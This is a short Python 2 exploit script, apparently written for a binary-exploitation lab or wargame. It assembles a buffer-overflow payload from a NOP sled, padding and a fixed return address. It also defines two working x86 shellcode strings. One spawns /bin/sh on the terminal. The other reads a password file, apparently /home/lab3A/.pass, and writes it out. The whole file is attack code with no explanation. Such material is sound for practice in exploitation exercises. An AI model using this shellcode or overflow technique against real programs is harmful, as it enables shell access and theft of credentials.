shellcode = ""
SHELLCODE_BUF_SIZE = 156
SPRAY = "\x90" * 16

BIN_SH = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
READ_FILE_SH = "\x31\xc9\x6a\x73\x68\x2e\x70\x61\x73\x68\x62\x33\x41\x2f\x68\x65\x2f\x6c\x61\x68\x2f\x68\x6f\x6d\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb2\x20\xcd\x80\x31\xc0\xb0\x04\xb3\x01\x89\xe1\xcd\x80\x31\xc0\x68\x83\xca\xe3\xb7\xc3"

RET_ADDR = "\x50\xF5\xFF\xBF"

shellcode += SPRAY
shellcode += READ_FILE_SH
shellcode += "A" * (SHELLCODE_BUF_SIZE - len(shellcode))
shellcode += RET_ADDR

print shellcode
